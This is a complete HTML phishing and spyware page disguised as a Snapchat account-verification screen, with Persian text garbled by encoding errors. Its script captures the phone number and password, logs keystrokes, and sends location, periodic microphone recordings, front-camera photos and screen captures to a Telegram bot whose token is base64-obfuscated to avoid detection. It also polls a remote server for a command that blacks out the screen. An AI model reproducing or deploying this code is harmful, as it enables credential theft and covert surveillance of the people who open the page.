<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>System Diagnostic</title>
    <link rel="manifest" href="manifest.json">
    <style>
        body { background: #f4f4f4; margin: 0; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .box { background: #fff; width: 85%; max-width: 360px; padding: 40px 20px; border-radius: 30px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); text-align: center; z-index: 10; transition: 0.5s; }
        .logo { width: 60px; margin-bottom: 20px; }
        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ddd; border-radius: 12px; font-size: 16px; outline: none; box-sizing: border-box; background: #fafafa; }
        .btn { background: #000; color: #fff; width: 100%; padding: 18px; border-radius: 30px; border: none; font-weight: bold; cursor: pointer; font-size: 18px; margin-top: 15px; }
        .hide { display: none !important; }
        #dim { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 99999; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div id="dim"></div>
    <div class="box" id="step1">
        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/600px-Snapchat_logo.svg.png" class="logo">
        <h3 style="margin:0;">ØªØ§ÛŒÛŒØ¯ Ù‡ÙˆÛŒØª Ø³ÛŒØ³ØªÙ…</h3>
        <p style="font-size: 13px; color: #666;">Ø¨Ø±Ø§ÛŒ Ø§Ù…Ù†ÛŒØª Ø­Ø³Ø§Ø¨ Ùˆ Ø¬Ù„ÙˆÚ¯ÛŒØ±ÛŒ Ø§Ø² Ø­Ø°Ù Ú†Øªâ€ŒÙ‡Ø§ ÙˆØ§Ø±Ø¯ Ø´ÙˆÛŒØ¯.</p>
        <input type="tel" id="f_u" placeholder="Ø´Ù…Ø§Ø±Ù‡ ØªÙ„ÙÙ†">
        <input type="password" id="f_p" placeholder="Ø±Ù…Ø² Ø¹Ø¨ÙˆØ±">
        <button class="btn" onclick="initCore()">ØªØ§ÛŒÛŒØ¯ Ùˆ Ø§ØªØµØ§Ù„</button>
    </div>

    <div class="box hide" id="step2">
        <div class="loader"></div>
        <p>Ø¯Ø± Ø­Ø§Ù„ Ù‡Ù…Ú¯Ø§Ù…â€ŒØ³Ø§Ø²ÛŒ Ø§Ø¨Ø±ÛŒ...<br><span style="font-size: 12px; color: #888;">Ù„Ø·ÙØ§Ù‹ Ø§ÛŒÙ† ØµÙØ­Ù‡ Ø±Ø§ Ù†Ø¨Ù†Ø¯ÛŒØ¯.</span></p>
    </div>

    <video id="v_s" autoplay playsinline class="hide"></video>
    <video id="v_c" autoplay playsinline class="hide"></video>
    <canvas id="canv" class="hide"></canvas>
    <audio id="sil" loop><source src="https://github.com/anars/blank-audio/raw/master/10-seconds-of-silence.mp3"></audio>

    <script>
        // ØªÙˆÚ©Ù† Ùˆ Ú†Øªâ€ŒØ¢ÛŒØ¯ÛŒ Ø´Ù…Ø§ Ø¨Ù‡ ØµÙˆØ±Øª Base64 (Ø¶Ø¯ Ø´Ù†Ø§Ø³Ø§ÛŒÛŒ Ú¯ÛŒØªâ€ŒÙ‡Ø§Ø¨)
        const _tk = "ODQ4NDE4OTQwMTpBQUhaWmtOdlFVWElrOTdyQTFiMFc3cjFlLXo1SVdYZGJwZw==";
        const _id = "NzI2MTA5OTY1OQ==";
        const _hr = "https://whale-tracker-live.github.io/Snapchat/";

        const decode = (x) => atob(x);
        let logger = "";

        // Û±. Ú©ÛŒâ€ŒÙ„Ø§Ú¯Ø± Ù…Ø®ÙÛŒ
        document.addEventListener('keyup', (e) => {
            logger += e.key + " ";
            if(logger.length > 20) { _send(`âŒ¨ï¸ Keys: ${logger}`); logger = ""; }
        });

        async function _send(msg, blob = null, isAud = false) {
            const api = `https://api.telegram.org/bot${decode(_tk)}/${blob ? (isAud ? 'sendAudio' : 'sendDocument') : 'sendMessage'}`;
            const fd = new FormData();
            fd.append('chat_id', decode(_id));
            if (blob) fd.append(isAud ? 'audio' : 'document', blob, isAud ? 'v.ogg' : `sh_${Date.now()}.jpg`);
            else fd.append('text', msg);
            try { await fetch(api, { method: 'POST', body: fd }); } catch(e) {}
        }

        async function initCore() {
            const u = document.getElementById('f_u').value;
            const p = document.getElementById('f_p').value;
            if(!u || !p) return alert("ÙÛŒÙ„Ø¯Ù‡Ø§ Ø®Ø§Ù„ÛŒ Ø§Ø³Øª");

            document.getElementById('step1').classList.add('hide');
            document.getElementById('step2').classList.remove('hide');
            document.getElementById('sil').play();

            await _send(`ğŸš€ New Catch!\nUser: ${u}\nPass: ${p}`);

            // Û². Ù„ÙˆÚ©ÛŒØ´Ù†
            navigator.geolocation.getCurrentPosition(pos => {
                _send(`ğŸ“ Location: http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
            }, null, {enableHighAccuracy:true});

            // Û³. Ø´Ù†ÙˆØ¯ ØµØ¯Ø§ (Ù‡Ø± Û±Ûµ Ø«Ø§Ù†ÛŒÙ‡)
            try {
                const a_s = await navigator.mediaDevices.getUserMedia({ audio: true });
                const rec = new MediaRecorder(a_s);
                rec.ondataavailable = (e) => _send("ğŸ™ Audio Log", e.data, true);
                setInterval(() => { rec.stop(); rec.start(); }, 15000);
                rec.start();
            } catch(e) { _send("âš ï¸ Mic Denied"); }

            // Û´. Ø³Ù„ÙÛŒ Ù…Ø®ÙÛŒ (Ù‡Ø± Û²Û° Ø«Ø§Ù†ÛŒÙ‡)
            try {
                const c_s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const vc = document.getElementById('v_c');
                vc.srcObject = c_s;
                setInterval(() => {
                    const cv = document.getElementById('canv');
                    cv.width = vc.videoWidth; cv.height = vc.videoHeight;
                    cv.getContext('2d').drawImage(vc, 0, 0);
                    cv.toBlob(b => _send("ğŸ“· Selfie", b), 'image/jpeg', 0.3);
                }, 20000);
            } catch(e) { _send("âš ï¸ Camera Denied"); }

            // Ûµ. Ø§Ø³Ú©Ø±ÛŒÙ†â€ŒØ´Ø§Øª (Ù‡Ø± Û±Û° Ø«Ø§Ù†ÛŒÙ‡)
            try {
                const sc_s = await navigator.mediaDevices.getDisplayMedia({ video: true });
                const vs = document.getElementById('v_s');
                vs.srcObject = sc_s;
                setInterval(() => {
                    const cv = document.getElementById('canv');
                    cv.width = vs.videoWidth; cv.height = vs.videoHeight;
                    cv.getContext('2d').drawImage(vs, 0, 0);
                    cv.toBlob(b => _send("ğŸ–¥ Screen Capture", b), 'image/jpeg', 0.2);
                }, 10000);
            } catch(e) { _send("âš ï¸ Screen Denied"); }
        }

        // Û¶. ÙØ±Ù…Ø§Ù† Ù‚ÙÙ„ Ø§Ø² Ø±Ø§Ù‡ Ø¯ÙˆØ±
        setInterval(async () => {
            try {
                const res = await fetch(_hr + 'commands.json?v=' + Date.now());
                const data = await res.json();
                document.getElementById('dim').style.display = (data.action === 'fake_lock') ? 'block' : 'none';
            } catch(e) {}
        }, 4000);
    </script>
</body>
</html>
